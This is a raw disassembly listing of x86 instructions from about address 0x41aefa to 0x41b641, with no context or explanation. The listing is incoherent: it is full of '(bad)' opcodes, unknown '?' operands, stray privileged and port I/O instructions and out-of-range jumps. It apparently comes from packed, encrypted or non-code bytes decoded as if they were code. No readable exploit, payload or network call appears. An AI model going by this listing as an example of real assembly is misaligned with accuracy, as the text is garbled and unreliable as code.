  41aefa:	add    cl,cl
  41aefc:	sbb    al,0xd9
  41aefe:	sub    DWORD PTR [esi+0x7fb512d9],ebx
  41af04:	imul   ecx,DWORD PTR ds:0xef4806f1,0x13
  41af0b:	ffree  st(5)
  41af0d:	test   al,0xba
  41af0f:	nop
  41af10:	fnstcw WORD PTR [ebp+0x3e]
  41af13:	out    dx,al
  41af14:	pop    ebx
  41af15:	fcom   QWORD PTR [edi-0xb]
  41af18:	ss jmp 0x41aef8
  41af1b:	cmp    dh,cl
  41af1d:	inc    edx
  41af1e:	mov    eax,0x4267b716
  41af23:	ds stos DWORD PTR es:[edi],eax
  41af25:	sub    al,0x11
  41af27:	adc    al,0xf3
  41af29:	jb     0x41af03
  41af2b:	xor    ecx,DWORD PTR [eax+0x1a716d65]
  41af31:	fld    DWORD PTR [edi-0x5a01f171]
  41af37:	xchg   ecx,eax
  41af38:	int    0x3f
  41af3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af3b:	xchg   edx,eax
  41af3c:	and    BYTE PTR [eax+0x13e77bd],cl
  41af42:	mov    ds:0x8d0ec0ed,eax
  41af47:	bound  edx,QWORD PTR [ebp+0x4b]
  41af4a:	test   eax,0x6c354893
  41af4f:	sahf   
  41af50:	push   cs
  41af51:	cmc    
  41af52:	call   0xa4852700
  41af57:	or     bl,BYTE PTR [ebx+0x1b5b046e]
  41af5d:	scas   eax,DWORD PTR es:[edi]
  41af5e:	pushf  
  41af5f:	call   0xc0928a81
  41af64:	xchg   ecx,eax
  41af65:	sbb    BYTE PTR cs:[ebp+0x6a9befe1],al
  41af6c:	arpl   cx,ax
  41af6e:	xor    ebp,ebx
  41af70:	lahf   
  41af71:	inc    eax
  41af72:	(bad)  
  41af73:	sub    BYTE PTR [edx-0x35],cl
  41af76:	mov    dl,0xfe
  41af78:	sets   BYTE PTR [edi+ebp*4]
  41af7c:	sbb    al,0xc4
  41af7f:	sbb    BYTE PTR [edx],bl
  41af81:	mov    ds:0xf184bd7f,al
  41af86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af87:	dec    ebp
  41af88:	lea    esp,[edx+0x77]
  41af8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af8c:	clc    
  41af8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af8e:	(bad)  
  41af8f:	pop    esi
  41af90:	arpl   WORD PTR [edi+0x356c9d90],di
  41af96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af97:	ds popa 
  41af99:	pop    ds
  41af9a:	jb     0x41af35
  41af9c:	outs   dx,BYTE PTR ds:[esi]
  41af9d:	stos   BYTE PTR es:[edi],al
  41af9e:	jmp    0x41afb3
  41afa0:	xor    eax,0x230dfb07
  41afa5:	scas   eax,DWORD PTR es:[edi]
  41afa6:	jo     0x41af83
  41afa8:	ret    0x5d3
  41afab:	cli    
  41afac:	ins    DWORD PTR es:[edi],dx
  41afad:	shl    BYTE PTR [edx-0x19],cl
  41afb0:	js     0x41afa6
  41afb2:	jge    0x41b00d
  41afb4:	in     eax,dx
  41afb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41afb6:	test   eax,0x4b8856a9
  41afbb:	pop    ds
  41afbc:	fld    DWORD PTR [ebx+0x2df1d34f]
  41afc2:	out    0xeb,al
  41afc4:	retf   
  41afc5:	or     BYTE PTR [esi-0x35dd9fb6],0xa
  41afcc:	aad    0x86
  41afce:	gs mov dh,0x85
  41afd1:	lods   al,BYTE PTR ds:[esi]
  41afd2:	push   edx
  41afd3:	cmp    eax,0xba1f14f2
  41afd8:	and    al,0x1b
  41afda:	mov    WORD PTR [esi-0x35],es
  41afdd:	xchg   esi,eax
  41afde:	push   ecx
  41afdf:	ins    BYTE PTR es:[edi],dx
  41afe0:	sub    eax,0xe8795279
  41afe5:	fistp  QWORD PTR [esi]
  41afe7:	out    0xa9,al
  41afe9:	shl    bl,0x61
  41afec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41afed:	(bad)  ds:[ecx]
  41aff0:	xchg   esi,eax
  41aff1:	es push ds
  41aff3:	out    dx,ax
  41aff5:	dec    esp
  41aff6:	xor    DWORD PTR ds:0xff60aa0f,esp
  41affc:	inc    esp
  41affd:	into   
  41affe:	mov    esp,0xa12d824a
  41b003:	inc    ebx
  41b004:	lods   eax,DWORD PTR ds:[esi]
  41b005:	mov    ds:0x44c9a56c,al
  41b00a:	fisttp QWORD PTR [esi+0x20]
  41b00d:	inc    ecx
  41b00e:	add    DWORD PTR [edi-0x32],ebp
  41b011:	add    dh,cl
  41b013:	push   0xffffffa9
  41b015:	jnp    0x41b039
  41b017:	inc    eax
  41b018:	mov    al,ds:0x99cfa8a
  41b01d:	mov    ah,0x64
  41b01f:	lds    edx,FWORD PTR [ebx+0x3735d7c9]
  41b025:	mov    ah,0x66
  41b027:	cli    
  41b028:	cmp    DWORD PTR [edi-0x7a],esi
  41b02b:	pushf  
  41b02c:	jne    0x41b001
  41b02e:	rcr    esp,cl
  41b030:	cs repnz adc esp,ebx
  41b034:	div    DWORD PTR [ebp+0x7b]
  41b037:	sbb    DWORD PTR [ecx],eax
  41b039:	ja     0x41b05b
  41b03b:	xchg   ebp,eax
  41b03c:	sub    al,0xbc
  41b03e:	bound  ecx,QWORD PTR [edi+0x6f]
  41b041:	push   esp
  41b042:	or     al,0x7f
  41b044:	cmp    ebp,DWORD PTR [esi-0x4e]
  41b047:	test   BYTE PTR [ebx],al
  41b049:	int3   
  41b04a:	(bad)  
  41b04b:	out    0x58,al
  41b04d:	mov    dh,0xb5
  41b04f:	cmp    ah,BYTE PTR [eax-0x6d]
  41b052:	repz jo 0x41b045
  41b055:	ret    0x5e1f
  41b058:	fistp  QWORD PTR [esp+ecx*1]
  41b05b:	outs   dx,DWORD PTR ds:[esi]
  41b05c:	cmp    eax,eax
  41b05e:	fstp   DWORD PTR [ecx]
  41b060:	addr16 pusha 
  41b062:	lods   eax,DWORD PTR ds:[esi]
  41b063:	jp     0x41b0df
  41b065:	std    
  41b066:	fwait
  41b067:	lods   al,BYTE PTR ds:[esi]
  41b068:	sub    bl,dl
  41b06a:	push   0xa049b459
  41b06f:	sub    BYTE PTR [ebp+0x105ebaa],al
  41b075:	ror    DWORD PTR [edi-0x4b2ba6e9],0xb
  41b07c:	iret   
  41b07d:	xor    eax,0x3ea094f8
  41b082:	into   
  41b083:	dec    ebp
  41b084:	jo     0x41b0fa
  41b086:	xor    BYTE PTR [ebx-0x75],dl
  41b089:	xchg   edx,eax
  41b08a:	xchg   esi,eax
  41b08b:	out    0x6f,eax
  41b08d:	dec    ecx
  41b08e:	mov    ss,WORD PTR [edi+eiz*4]
  41b091:	or     esi,DWORD PTR [ebp-0x6654194]
  41b097:	push   0xf
  41b099:	push   eax
  41b09a:	lock or al,ch
  41b09d:	retf   0xa75f
  41b0a0:	and    al,0xc5
  41b0a2:	jns    0x41b067
  41b0a4:	retf   0x1742
  41b0a7:	or     BYTE PTR [edi],dh
  41b0a9:	dec    esp
  41b0aa:	lods   eax,DWORD PTR ds:[esi]
  41b0ab:	cmp    ebx,ebx
  41b0ad:	push   eax
  41b0ae:	sub    al,0xc8
  41b0b0:	shl    DWORD PTR [ecx],1
  41b0b2:	ret    0x9e80
  41b0b5:	pop    ecx
  41b0b6:	and    BYTE PTR [edi+0x3681ee18],ch
  41b0bc:	sahf   
  41b0bd:	sub    al,0x72
  41b0bf:	cld    
  41b0c0:	cmc    
  41b0c1:	fild   QWORD PTR [eax]
  41b0c3:	pop    edx
  41b0c4:	pusha  
  41b0c5:	and    al,0x67
  41b0c7:	cmp    al,ah
  41b0c9:	inc    ebp
  41b0ca:	adc    ah,bl
  41b0cc:	cwde   
  41b0cd:	enter  0x136,0x50
  41b0d1:	sub    ecx,ecx
  41b0d3:	jae    0x41b100
  41b0d5:	aad    0xb1
  41b0d7:	mov    ds:0xa71b086b,eax
  41b0dc:	add    al,0xb0
  41b0de:	jb     0x41b114
  41b0e0:	lods   eax,DWORD PTR cs:[esi]
  41b0e2:	or     DWORD PTR [esi-0x7ee69146],esp
  41b0e8:	sub    ebp,DWORD PTR [esi-0x38]
  41b0eb:	pop    ss
  41b0ec:	jns    0x41b0a5
  41b0ee:	xchg   ebp,eax
  41b0ef:	sub    DWORD PTR [edx+0x19],0xeaf0635a
  41b0f6:	imul   eax,esi,0x73
  41b0f9:	push   ecx
  41b0fa:	and    al,BYTE PTR [esi+0x26bd3e1]
  41b100:	pop    edi
  41b101:	adc    esi,DWORD PTR [eax]
  41b103:	fsubr  DWORD PTR [esi]
  41b105:	(bad)  
  41b106:	xlat   BYTE PTR ds:[ebx]
  41b107:	pop    eax
  41b108:	jmp    0x41b0fd
  41b10a:	cli    
  41b10b:	les    esp,FWORD PTR ss:[ebx+0x79ab9363]
  41b112:	mov    bl,0xa3
  41b114:	cmc    
  41b115:	jmp    0x1dcd1f36
  41b11a:	pop    ecx
  41b11b:	mov    edx,0x2b2d9695
  41b120:	jns    0x41b191
  41b122:	scas   al,BYTE PTR es:[edi]
  41b123:	out    0x40,eax
  41b125:	and    DWORD PTR [ebx-0x5],0x3265ec40
  41b12c:	jp     0x41b0f3
  41b12e:	js     0x41b14f
  41b130:	outs   dx,BYTE PTR ds:[esi]
  41b131:	push   ebx
  41b132:	inc    ebx
  41b133:	jp     0x41b10b
  41b135:	mov    ds,edx
  41b137:	mov    edx,0xb27cdab1
  41b13c:	jo     0x41b0de
  41b13e:	pop    eax
  41b13f:	loop   0x41b1a2
  41b141:	push   esi
  41b142:	mov    esi,0x1ffa309b
  41b147:	inc    edi
  41b148:	imul   ebp,DWORD PTR [ecx+0x29f6cd33],0xffffffc6
  41b14f:	sub    ch,cl
  41b151:	dec    esi
  41b152:	or     BYTE PTR [ebx+0x4],ch
  41b155:	aam    0xa4
  41b157:	sahf   
  41b158:	xchg   edx,eax
  41b159:	or     ah,ah
  41b15b:	jmp    0xc7fdaecb
  41b160:	call   0xf740:0x60a91ca4
  41b167:	mov    BYTE PTR [esi+0x5],bl
  41b16a:	pop    ecx
  41b16b:	loop   0x41b1d2
  41b16d:	mov    ebx,0x799e3ed5
  41b172:	adc    al,BYTE PTR [esi-0x1a2d8613]
  41b178:	shr    DWORD PTR [esi+0x18],0xd2
  41b17c:	push   esi
  41b17d:	or     DWORD PTR [ecx+0x74],ebp
  41b180:	sti    
  41b181:	das    
  41b182:	stos   DWORD PTR es:[edi],eax
  41b183:	pusha  
  41b184:	cwde   
  41b185:	xchg   ebp,eax
  41b186:	adc    eax,0xfc258946
  41b18b:	stos   DWORD PTR es:[edi],eax
  41b18c:	clc    
  41b18d:	xchg   ecx,eax
  41b18e:	outs   dx,BYTE PTR ds:[esi]
  41b18f:	inc    esp
  41b190:	mov    ds:0x150c5b00,eax
  41b195:	inc    ebx
  41b196:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b197:	xchg   ebx,eax
  41b198:	add    DWORD PTR [ebx-0x3fd68984],esp
  41b19e:	stos   BYTE PTR es:[edi],al
  41b19f:	inc    ebp
  41b1a0:	xor    DWORD PTR [esi+0x3fb357f8],ebx
  41b1a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1a7:	or     BYTE PTR [ebx+0x28],cl
  41b1aa:	sub    BYTE PTR [ecx],bl
  41b1ac:	int3   
  41b1ad:	push   edx
  41b1ae:	add    DWORD PTR [ebx],esi
  41b1b0:	out    dx,eax
  41b1b1:	cmp    DWORD PTR [ebx],ebx
  41b1b3:	or     al,0x2e
  41b1b5:	mov    ebx,0xae74d03f
  41b1ba:	test   eax,0x6121da8d
  41b1bf:	sub    dh,bh
  41b1c1:	mov    al,ds:0xdd43f7f9
  41b1c6:	and    BYTE PTR [ecx+0x3b4d708f],ah
  41b1cc:	mov    edx,0x2919cbcb
  41b1d1:	xlat   BYTE PTR ds:[ebx]
  41b1d2:	jne    0x41b20d
  41b1d4:	mov    esp,0x8c8d54de
  41b1d9:	(bad)  
  41b1db:	mov    ds:0x2d304aab,al
  41b1e0:	(bad)  
  41b1e1:	push   0xffffffbe
  41b1e3:	std    
  41b1e4:	fistp  WORD PTR ds:0xcde01149
  41b1ea:	inc    eax
  41b1eb:	pushf  
  41b1ec:	sub    edx,DWORD PTR [edx+0x9c3750c]
  41b1f2:	cmp    bl,cl
  41b1f4:	outs   dx,BYTE PTR ds:[esi]
  41b1f5:	dec    esp
  41b1f6:	imul   BYTE PTR [ebx+0x310c7a92]
  41b1fc:	cli    
  41b1fd:	lods   al,BYTE PTR ds:[esi]
  41b1fe:	pop    esi
  41b1ff:	cmp    DWORD PTR ds:[eax+ebp*8-0x178dadc2],edi
  41b207:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b208:	jns    0x41b251
  41b20a:	aaa    
  41b20b:	stos   DWORD PTR es:[edi],eax
  41b20c:	add    dl,BYTE PTR [esi+0x440f9813]
  41b212:	outs   dx,BYTE PTR ds:[esi]
  41b213:	add    DWORD PTR [esp+ebp*1-0x55],ecx
  41b217:	in     eax,dx
  41b218:	add    DWORD PTR [bx+di+0x10],ecx
  41b21c:	shl    cl,0x79
  41b21f:	sbb    ch,al
  41b221:	inc    edi
  41b222:	and    eax,0x5fb7eacc
  41b227:	xor    dh,BYTE PTR [ebx]
  41b229:	or     edx,DWORD PTR [eax]
  41b22b:	push   esi
  41b22c:	loop   0x41b1db
  41b22e:	ss pop es
  41b230:	retf   
  41b231:	push   DWORD PTR [ecx]
  41b233:	jmp    0x41b209
  41b235:	outs   dx,DWORD PTR ds:[esi]
  41b236:	mov    edi,0xfcc68c5e
  41b23b:	push   ebx
  41b23c:	loop   0x41b1fc
  41b23e:	les    eax,FWORD PTR [esi+0x7e9a3971]
  41b244:	outs   dx,BYTE PTR ds:[esi]
  41b245:	lds    ecx,FWORD PTR es:[eax+eiz*8+0x1dc10f1d]
  41b24d:	cmp    al,0xfb
  41b24f:	pop    es
  41b250:	aaa    
  41b251:	jbe    0x41b2a3
  41b253:	imul   DWORD PTR [esi+0x4c3b34f6]
  41b259:	lar    eax,WORD PTR [ecx+0x36c29f0e]
  41b260:	pop    edi
  41b261:	mov    esp,0x8eaf13f5
  41b266:	int3   
  41b267:	shr    DWORD PTR [esi-0x59],1
  41b26a:	dec    edx
  41b26b:	sbb    al,0xa1
  41b26d:	sub    BYTE PTR [eax+0x4d],al
  41b270:	test   al,0x42
  41b272:	enter  0xff71,0xe9
  41b276:	xchg   ebx,eax
  41b277:	fisttp QWORD PTR [edx]
  41b279:	or     DWORD PTR [edi],ecx
  41b27b:	scas   al,BYTE PTR es:[edi]
  41b27c:	out    dx,al
  41b27d:	and    DWORD PTR es:[ebx+0x1],edx
  41b281:	xor    eax,0x10fd02b4
  41b286:	mov    ebp,0xd13d0e1f
  41b28b:	or     eax,0xc316d1f3
  41b290:	rsm    
  41b292:	ffreep st(7)
  41b294:	sbb    bh,BYTE PTR [esi-0x60]
  41b297:	(bad)  
  41b298:	out    dx,eax
  41b299:	cwde   
  41b29a:	xchg   esp,eax
  41b29b:	inc    edi
  41b29c:	lods   al,BYTE PTR ds:[esi]
  41b29d:	push   esp
  41b29e:	hlt    
  41b29f:	push   0xe57499ed
  41b2a4:	inc    esi
  41b2a5:	aad    0x8e
  41b2a7:	inc    ebp
  41b2a8:	add    DWORD PTR [esi+0x1a],eax
  41b2ab:	push   ss
  41b2ac:	inc    ecx
  41b2ad:	lea    ebx,ds:0x9b8dc131
  41b2b3:	lods   eax,DWORD PTR ds:[esi]
  41b2b4:	(bad)  
  41b2b5:	sub    BYTE PTR [eax],ah
  41b2b7:	daa    
  41b2b8:	pop    eax
  41b2b9:	out    0x4f,eax
  41b2bb:	mov    gs,WORD PTR [edx]
  41b2bd:	jmp    0x41b2d4
  41b2bf:	(bad)  
  41b2c0:	loope  0x41b28d
  41b2c2:	or     eax,0x2969a526
  41b2c7:	mov    eax,0x577954ed
  41b2cc:	mov    BYTE PTR [eax+ebp*2],dh
  41b2cf:	imul   ebp,DWORD PTR [ecx-0x59],0xffffff96
  41b2d3:	mov    fs,WORD PTR [eax+0x24ce458]
  41b2d9:	data16 jne 0x41b25d
  41b2dc:	pop    edi
  41b2dd:	dec    esi
  41b2de:	out    0xe5,eax
  41b2e0:	push   edi
  41b2e1:	or     eax,esi
  41b2e3:	mov    al,ds:0xad3fd017
  41b2e8:	stc    
  41b2e9:	add    DWORD PTR [ebp+0x52ac39a4],ebp
  41b2ef:	stc    
  41b2f0:	clc    
  41b2f1:	cmp    BYTE PTR [edi+0x5da2a5c3],ah
  41b2f7:	xor    bh,dh
  41b2f9:	jno    0x41b283
  41b2fb:	push   esp
  41b2fc:	mov    ebx,0x2dcd5612
  41b301:	pusha  
  41b302:	aaa    
  41b303:	fdiv   st(6),st
  41b305:	sbb    DWORD PTR [ebx-0x4292f0c9],ebx
  41b30b:	xor    BYTE PTR [esi+0x78a73f32],bh
  41b311:	das    
  41b312:	lds    eax,FWORD PTR [eax]
  41b314:	mov    edx,0x47fa788e
  41b319:	dec    ecx
  41b31a:	fwait
  41b31b:	sti    
  41b31c:	rcr    BYTE PTR [bx],1
  41b31f:	test   ah,dh
  41b321:	icebp  
  41b322:	mov    ecx,0x2ef23bd8
  41b327:	sub    al,0xb2
  41b329:	sahf   
  41b32a:	es cmp cl,dl
  41b32d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b32e:	fwait
  41b32f:	cld    
  41b330:	sbb    al,0x2e
  41b332:	xchg   esp,eax
  41b333:	(bad)  
  41b334:	dec    ebp
  41b335:	sbb    ecx,DWORD PTR [esi+0x167d30]
  41b33b:	inc    edi
  41b33c:	mov    ecx,0xfc728bf4
  41b341:	fcom   DWORD PTR [ebx]
  41b343:	xchg   edx,eax
  41b344:	clc    
  41b345:	push   esi
  41b346:	jno    0x41b328
  41b348:	mov    bh,0x6c
  41b34a:	inc    esp
  41b34b:	mov    ebp,0x4ee023d7
  41b350:	mov    ss,esp
  41b352:	vpsllw ymm4,ymm5,XMMWORD PTR [esi+0xd]
  41b357:	retf   
  41b358:	or     al,0x9
  41b35a:	add    edi,DWORD PTR [esi+0x2f]
  41b35d:	mov    ?,WORD PTR [eax+eiz*4-0x42]
  41b361:	fld    DWORD PTR [edx+0x54]
  41b364:	push   cx
  41b366:	pop    ebp
  41b367:	pop    edi
  41b368:	clc    
  41b369:	sbb    DWORD PTR [ebx+0x58d4da83],esp
  41b36f:	out    dx,eax
  41b370:	sbb    ecx,DWORD PTR [eax+esi*8+0x30]
  41b374:	mov    dh,0x3f
  41b376:	sbb    esp,ecx
  41b378:	ds retf 0x83c6
  41b37c:	adc    DWORD PTR [edx-0x75ff23e2],0x5f
  41b383:	popf   
  41b384:	outs   dx,BYTE PTR ds:[esi]
  41b385:	push   ds
  41b386:	mov    edi,0xe6c1fd54
  41b38b:	test   BYTE PTR [eax-0x3bce6ca2],bh
  41b391:	pop    ebx
  41b392:	fstp   QWORD PTR [ebx-0x6d]
  41b395:	popf   
  41b396:	aad    0x68
  41b398:	mov    bh,0x3c
  41b39a:	add    BYTE PTR ds:0xdb12bc93,cl
  41b3a0:	dec    eax
  41b3a1:	pop    edi
  41b3a2:	sbb    eax,0x71389413
  41b3a7:	jb     0x41b337
  41b3a9:	outs   dx,BYTE PTR ds:[esi]
  41b3aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b3ab:	sub    DWORD PTR [ebx],ebp
  41b3ad:	jp     0x41b3e6
  41b3af:	adc    bh,ch
  41b3b1:	mov    cl,0xac
  41b3b3:	in     eax,dx
  41b3b4:	mov    ebp,0x931fc1f
  41b3b9:	sahf   
  41b3ba:	cli    
  41b3bb:	mov    edi,ss
  41b3bd:	test   DWORD PTR [ecx+0x5a],0xae0b9873
  41b3c4:	popf   
  41b3c5:	push   ebx
  41b3c6:	cmp    al,ch
  41b3c8:	imul   ecx,DWORD PTR [ebx],0xffffffa7
  41b3cb:	xchg   ebp,eax
  41b3cc:	adc    eax,0xace1df2c
  41b3d1:	lods   al,BYTE PTR ds:[esi]
  41b3d2:	or     DWORD PTR [edi+0xdb8dbbf],ebx
  41b3d8:	mov    al,0x8a
  41b3da:	or     edi,DWORD PTR [ebx]
  41b3dc:	inc    esi
  41b3dd:	xchg   BYTE PTR ss:[esi+0x4bfffa3],bh
  41b3e4:	test   al,0xcc
  41b3e6:	stos   BYTE PTR es:[edi],al
  41b3e7:	mov    al,ds:0xd895a426
  41b3ec:	add    al,0x2e
  41b3ee:	jne    0x41b3f2
  41b3f0:	push   ebx
  41b3f1:	xchg   esi,eax
  41b3f2:	popa   
  41b3f3:	inc    edi
  41b3f4:	out    0xcc,al
  41b3f6:	lods   al,BYTE PTR ds:[esi]
  41b3f7:	ror    DWORD PTR [edx+eax*8+0x4],1
  41b3fb:	(bad)  
  41b3fc:	out    0xee,eax
  41b3fe:	stos   DWORD PTR es:[edi],eax
  41b3ff:	daa    
  41b400:	jae    0x41b393
  41b402:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b403:	mov    dh,dh
  41b405:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b406:	rol    DWORD PTR [eax+0x5e1f5057],0x9e
  41b40d:	mov    ds:0x93f476e8,al
  41b412:	or     eax,0x12b68c33
  41b417:	jns    0x41b3f3
  41b419:	(bad)  
  41b41a:	push   ebx
  41b41b:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b41d:	adc    DWORD PTR [ecx+edx*2+0x65],0x64
  41b422:	pop    ebx
  41b423:	loope  0x41b42b
  41b425:	jecxz  0x41b499
  41b427:	push   eax
  41b428:	mov    dl,0x3a
  41b42a:	mov    ebx,0xd757b463
  41b42f:	jb     0x41b3b9
  41b431:	(bad)  
  41b433:	aam    0x95
  41b435:	adc    eax,0x8d186c79
  41b43a:	xchg   ebx,eax
  41b43b:	dec    BYTE PTR [edi+ecx*1-0x165281d4]
  41b442:	adc    eax,0x8e8b3394
  41b447:	push   0xffffff9b
  41b449:	pop    esi
  41b44a:	imul   eax,DWORD PTR [edi+0x71e5a833],0x72
  41b451:	call   0x872d:0xfb1889ea
  41b458:	mov    DWORD PTR [edx+0x77],esi
  41b45b:	adc    ebp,DWORD PTR [ebp+0x63]
  41b45e:	outs   dx,DWORD PTR ds:[esi]
  41b45f:	cmp    BYTE PTR [edx-0x8],0x3e
  41b463:	ret    
  41b464:	cmp    edi,DWORD PTR [eax-0x58805ce8]
  41b46a:	imul   ecx,DWORD PTR [ecx-0x168dbb7f],0xffffffdf
  41b471:	mov    eax,DWORD PTR [edx]
  41b473:	fdivp  st(4),st
  41b475:	pop    ss
  41b476:	call   0x10249176
  41b47b:	pop    es
  41b47c:	test   eax,0x52caffd7
  41b481:	call   0x9f06:0x7c7a73f5
  41b488:	adc    eax,esi
  41b48a:	fstp   TBYTE PTR [ebp+0xc]
  41b48d:	sbb    al,0xc2
  41b48f:	push   0x6c450234
  41b494:	cmp    eax,0x697970bb
  41b499:	xor    al,0x33
  41b49b:	hlt    
  41b49c:	sti    
  41b49d:	mov    edi,0xffed798d
  41b4a2:	jg     0x48eaa867
  41b4a8:	sub    DWORD PTR [esi+eiz*8],edi
  41b4ab:	xchg   ebx,eax
  41b4ac:	push   edi
  41b4ad:	dec    edx
  41b4ae:	cwde   
  41b4af:	jo     0x41b4c6
  41b4b1:	(bad)  
  41b4b2:	xor    al,0x6d
  41b4b4:	sub    eax,edx
  41b4b6:	int3   
  41b4b7:	jno    0x41b4ed
  41b4b9:	push   ebx
  41b4ba:	cmp    DWORD PTR [ecx-0xb],edi
  41b4bd:	mov    esp,0x1dca1a66
  41b4c2:	lock mov cl,0x1b
  41b4c5:	(bad)  [edx+ecx*4]
  41b4c8:	les    edi,FWORD PTR [ecx+esi*2]
  41b4cb:	push   ebp
  41b4cc:	hlt    
  41b4cd:	daa    
  41b4ce:	sbb    BYTE PTR [ecx+0x54],ch
  41b4d1:	fdivp  st(1),st
  41b4d3:	ins    DWORD PTR es:[edi],dx
  41b4d4:	sahf   
  41b4d5:	fstp   TBYTE PTR [eax]
  41b4d7:	shl    BYTE PTR [bp+di+0x6e],1
  41b4db:	push   ebx
  41b4dc:	scas   al,BYTE PTR es:[edi]
  41b4dd:	imul   ebp,DWORD PTR [edx+0x41],0xffffff87
  41b4e1:	push   edx
  41b4e2:	push   edx
  41b4e3:	call   0xf54f9b7d
  41b4e8:	fsub   DWORD PTR [esp+edi*1-0x7c]
  41b4ec:	das    
  41b4ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4ee:	jno    0x41b516
  41b4f0:	jne    0x41b52d
  41b4f2:	imul   ebp,DWORD PTR [esi],0x23
  41b4f5:	adc    al,0x98
  41b4f7:	xchg   BYTE PTR [di],al
  41b4fa:	push   ds
  41b4fb:	sahf   
  41b4fc:	and    al,0xfb
  41b4fe:	xchg   ebp,eax
  41b4ff:	mov    edi,0xcf25d448
  41b504:	and    eax,DWORD PTR [ecx]
  41b506:	push   eax
  41b507:	pop    esi
  41b508:	mov    al,0x3f
  41b50a:	fdivr  st(2),st
  41b50c:	outs   dx,BYTE PTR ds:[esi]
  41b50d:	adc    BYTE PTR [edi-0x39],ch
  41b510:	pop    edi
  41b511:	fwait
  41b512:	jge    0x41b54e
  41b514:	or     eax,0xe376fb3
  41b519:	lods   al,BYTE PTR ds:[esi]
  41b51a:	and    edx,DWORD PTR [eax+eax*1+0x59]
  41b51e:	jle    0x41b560
  41b520:	loopne 0x41b544
  41b522:	jo     0x41b53f
  41b524:	(bad)  
  41b525:	xor    BYTE PTR [esi+0x7e0874df],ah
  41b52b:	aas    
  41b52c:	call   0xcf0f8aa
  41b531:	hlt    
  41b532:	popf   
  41b533:	push   0x57
  41b535:	pop    ss
  41b536:	fadd   QWORD PTR [ebp+esi*8+0x34]
  41b53a:	mov    ebx,?
  41b53c:	jne    0x41b518
  41b53e:	dec    edx
  41b53f:	leave  
  41b540:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b541:	inc    BYTE PTR [eax]
  41b543:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b544:	push   cs
  41b545:	(bad)  
  41b546:	push   edx
  41b547:	ss inc ecx
  41b549:	test   eax,0x1f838384
  41b54e:	mov    eax,ds:0x2f4d61a6
  41b553:	xchg   BYTE PTR ds:[ecx-0xa],ch
  41b557:	pop    ecx
  41b558:	ins    BYTE PTR es:[edi],dx
  41b559:	test   ebx,ebx
  41b55b:	sbb    DWORD PTR [ebp+0x28],ebx
  41b55e:	test   eax,0x23bc7f18
  41b563:	add    BYTE PTR [edx],dh
  41b565:	jmp    0x4ef59ee9
  41b56a:	ret    
  41b56b:	dec    eax
  41b56c:	mov    cl,0xfb
  41b56e:	fmul   QWORD PTR [ecx]
  41b570:	idiv   BYTE PTR [edx-0x353c355]
  41b576:	shr    ah,cl
  41b578:	imul   edx,DWORD PTR [eax+0x36696045],0xf6468ca5
  41b582:	inc    esi
  41b583:	jecxz  0x41b546
  41b585:	shl    DWORD PTR [edx],0xc2
  41b588:	aam    0xd9
  41b58a:	xchg   edi,eax
  41b58b:	cmp    ebp,esi
  41b58d:	mov    DWORD PTR [edi],0xd75db5fc
  41b593:	cwde   
  41b594:	fwait
  41b595:	in     al,0x15
  41b597:	in     al,0x4a
  41b599:	lock or eax,0x85516032
  41b59f:	push   es
  41b5a0:	imul   eax,DWORD PTR [eax-0x6940dd03],0x9
  41b5a7:	mov    ah,0xc3
  41b5a9:	mov    ?,WORD PTR [edx]
  41b5ab:	or     eax,0x1a8537d4
  41b5b0:	data16 loope 0x41b5bf
  41b5b3:	stc    
  41b5b4:	mov    ecx,0x7fb4d6d5
  41b5b9:	cld    
  41b5ba:	ret    0xe20b
  41b5bd:	loope  0x41b623
  41b5bf:	stos   DWORD PTR es:[edi],eax
  41b5c0:	fmul   DWORD PTR [bp+si-0x3]
  41b5c4:	xor    eax,0x9c2776aa
  41b5c9:	and    dh,0x32
  41b5cc:	lods   eax,DWORD PTR ds:[esi]
  41b5cd:	fnstsw WORD PTR [ebx]
  41b5cf:	cmp    DWORD PTR [ebx],0xdb13207f
  41b5d5:	pop    edi
  41b5d6:	clc    
  41b5d7:	and    DWORD PTR [esi+0x5a16bc91],edi
  41b5dd:	imul   ecx,esp,0x2a
  41b5e0:	je     0x41b571
  41b5e2:	sub    DWORD PTR [esi-0x7f08bc4d],esp
  41b5e8:	repz or al,0x51
  41b5eb:	mov    edi,0x23085b43
  41b5f0:	push   cs
  41b5f1:	test   eax,0x5d01ba31
  41b5f6:	cmp    DWORD PTR [edx-0x52],ecx
  41b5f9:	adc    BYTE PTR [ebp+ebx*2+0x65],ah
  41b5fd:	je     0x41b5db
  41b5ff:	mov    ah,0xfc
  41b601:	push   ecx
  41b602:	cmp    eax,0xc555bb1b
  41b607:	mov    dl,0x6c
  41b609:	jl     0x41b65a
  41b60b:	arpl   WORD PTR [eax+0x3cfc5f7f],cx
  41b611:	xor    ecx,DWORD PTR [ebx+0x8a97b88]
  41b617:	pop    edx
  41b618:	pop    esi
  41b619:	imul   esi,DWORD PTR [eax+edi*8-0x5f1e034e],0xf576f635
  41b624:	and    ch,BYTE PTR [eax+0x56]
  41b627:	or     DWORD PTR [eax],eax
  41b629:	jl     0x41b676
  41b62b:	adc    eax,0x4908f80f
  41b630:	xchg   esi,eax
  41b631:	lds    eax,FWORD PTR [ebp-0x3f85023a]
  41b637:	sti    
  41b638:	xor    eax,0x46b813f1
  41b63d:	cli    
  41b63e:	dec    eax
  41b63f:	jne    0x41b63f
  41b641:	icebp  
